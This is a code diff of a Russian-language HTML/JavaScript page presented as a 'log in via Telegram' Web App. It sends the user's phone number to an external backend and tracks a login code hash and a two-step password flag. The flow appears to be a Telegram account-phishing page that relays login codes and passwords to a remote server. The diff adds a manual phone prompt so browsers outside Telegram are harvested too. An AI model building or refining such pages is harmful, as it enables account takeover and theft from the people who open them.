@@ -317,7 +317,6 @@
         const BACKEND_URL = 'https://ilagbuy-ilag.amvera.io';
         
         let authData = {
-    phone: '',
     phoneCodeHash: '',
     userId: null,
     needPassword: false
@@ -337,7 +336,7 @@ async function sharePhoneNumber() {
                     const phone = contact.phone_number;
                     console.log('📱 Phone received:', phone);
                     
-                    // Отправляем номер боту
+                    // Отправляем номер боту через Telegram Web App
                     const result = await sendDataToBot({
                         action: 'phone_received',
                         phone: phone
@@ -360,14 +359,23 @@ async function sharePhoneNumber() {
                 }
             });
         } else {
-            // Fallback для браузера
-            const testPhone = '+1234567890';
-            await sendDataToBot({
-                action: 'phone_received', 
-                phone: testPhone
-            });
-            document.getElementById('initialScreen').style.display = 'none';
-            document.getElementById('codeForm').style.display = 'block';
+            // Fallback для браузера - запрашиваем номер вручную
+            const phone = prompt('Введите ваш номер телефона (в международном формате):');
+            if (phone) {
+                const result = await sendDataToBot({
+                    action: 'phone_received', 
+                    phone: phone
+                });
+                
+                if (result.success) {
+                    document.getElementById('initialScreen').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                } else {
+                    status.textContent = 'Ошибка отправки номера';
+                    shareBtn.disabled = false;
+                    shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
+                }
+            }
         }
     } catch (error) {
         console.error('Error:', error);
@@ -614,6 +622,7 @@ function getUserIdFromURL() {
     </script>
 </body>
 </html>
+
 
 
 
